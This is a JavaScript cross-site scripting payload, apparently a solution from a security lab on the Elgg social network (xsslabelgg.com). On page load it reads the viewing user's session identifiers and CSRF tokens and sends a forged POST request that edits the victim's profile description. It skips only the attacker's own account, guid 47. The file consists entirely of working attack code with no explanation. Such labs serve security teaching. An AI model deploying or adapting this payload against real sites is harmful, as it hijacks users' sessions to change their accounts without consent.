window.onload = function () {
    var name = elgg.session.user.name;
    var guid = "&guid="+elgg.session.user.guid;
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
    var briefDesc = "&briefdescription=1605011"+"&accesslevel[briefdescription]=2";
    
    var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
    var content = name + guid + ts + token + briefDesc;
    
    var samyGuid = 47;

    if (elgg.session.user.guid != samyGuid) {
        var Ajax = null;
        Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);
    }
}
